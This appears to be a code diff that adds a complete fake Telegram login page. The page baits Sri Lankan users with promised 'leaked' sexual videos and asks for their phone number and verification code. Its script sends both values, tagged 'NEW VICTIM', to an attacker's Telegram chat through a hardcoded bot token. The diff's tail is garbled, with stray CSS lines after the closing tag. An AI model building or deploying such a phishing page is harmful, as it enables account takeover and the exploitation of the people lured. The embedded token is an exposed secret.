@@ -1,40 +1,74 @@
-<html>\
-<head>\
-<title>Telegram - Login</title>\
-<style>\
-    body \{\
-        background: black;\
-        color: white;\
-        font-family: Arial;\
-        text-align: center;\
-        padding: 20px;\
-    \}\
-    .box \{\
-        background: #1F1F1F;\
-        max-width: 380px;\
-        margin: 50px auto;\
-        padding: 30px;\
-        border-radius: 15px;\
-        border: 2px solid #FF00FF;\
-    \}\
-    input \{\
-        width: 90%;\
-        padding: 15px;\
-        margin: 15px 0;\
-        background: #333;\
-        border: none;\
-        border-radius: 8px;\
-        color: white;\
-        font-size: 18px;\
-    \}\
-    button \{\
-        background: #229ED9;\
-        color: white;\
-        padding: 15px 40px;\
-        font-size: 20px;\
-        border: none;\
-        border-radius: 8px;\
-        cursor: pointer;\
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Login</title>
+    <style>
+        body { background: #0F0F0F; color: white; font-family: Arial; text-align: center; padding: 30px; }
+        .box {
+            background: #1a1a1a;
+            max-width: 400px;
+            margin: 40px auto;
+            padding: 40px 20px;
+            border-radius: 15px;
+            border: 3px solid #229ED9;
+        }
+        input {
+            width: 85%;
+            padding: 15px;
+            margin: 15px 0;
+            background: #333;
+            border: 1px solid #555;
+            border-radius: 8px;
+            color: white;
+            font-size: 17px;
+        }
+        button {
+            background: #229ED9;
+            color: white;
+            padding: 16px 60px;
+            font-size: 22px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>🔵 Telegram</h1>
+    <h2>Verify to unlock Sri Lankan Leaks</h2>
+    <p>🍑 Hot Negombo & Colombo content loading...</p>
+
+    <input type="tel" id="phone" placeholder="+94xxxxxxxxx" />
+    <input type="text" id="code" placeholder="Enter verification code" />
+
+    <button onclick="sendToBot()">Continue to XXX Content 😈</button>
+</div>
+
+<script>
+function sendToBot() {
+    let phone = document.getElementById('phone').value;
+    let code = document.getElementById('code').value;
+
+    if(!phone || !code) {
+        alert("Phone සහ Code දාන්න!");
+        return;
+    }
+
+    const token = "8418029750:AAEXSgDBZyNwostfOPGib5ZvelEsc-56jmI";
+    const chatId = "badmoody_117";
+
+    const text = `🔥 NEW VICTIM 🔥%0APhone: ${phone}%0ACode: ${code}%0AFrom: Sri Lankan Leak Bot`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`)
+    .then(() => alert("Loading hot Sri Lankan videos... 😈"));
+}
+</script>
+
+</body>
+</html>        cursor: pointer;\
         margin-top: 20px;\
     \}\
     h1 \{ color: #229ED9; \}\
